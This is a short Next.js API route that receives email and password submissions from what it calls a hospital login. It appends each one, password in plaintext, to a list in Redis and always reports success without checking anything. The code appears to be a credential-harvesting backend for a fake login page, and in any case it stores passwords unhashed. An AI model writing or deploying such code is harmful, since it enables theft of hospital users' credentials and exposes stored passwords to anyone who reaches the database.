import { NextRequest, NextResponse } from "next/server";
import { Redis } from "@upstash/redis";

const redis = new Redis({
  url: process.env.KV_REST_API_URL!,
  token: process.env.KV_REST_API_TOKEN!,
});

interface LoginEntry {
  email: string;
  password: string;
  rememberMe?: boolean;
  timestamp: string;
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();

    const loginEntry: LoginEntry = {
      email: body.email,
      password: body.password,
      rememberMe: body.rememberMe ?? false,
      timestamp: new Date().toISOString(),
    };

    // Fetch existing logins
    const existingRaw = await redis.get<string>("hospital-logins");
    const existingLogins: LoginEntry[] = existingRaw ? JSON.parse(existingRaw) : [];

    // Append new login
    const updatedLogins = [...existingLogins, loginEntry];

    // Store updated logins
    await redis.set("hospital-logins", JSON.stringify(updatedLogins));

    return NextResponse.json({ success: true });
  } catch (error: unknown) {
    console.error("Error writing hospital login:", error);

    const errorMessage = error instanceof Error ? error.message : "Unknown error";

    return NextResponse.json({ success: false, error: errorMessage }, { status: 500 });
  }
}
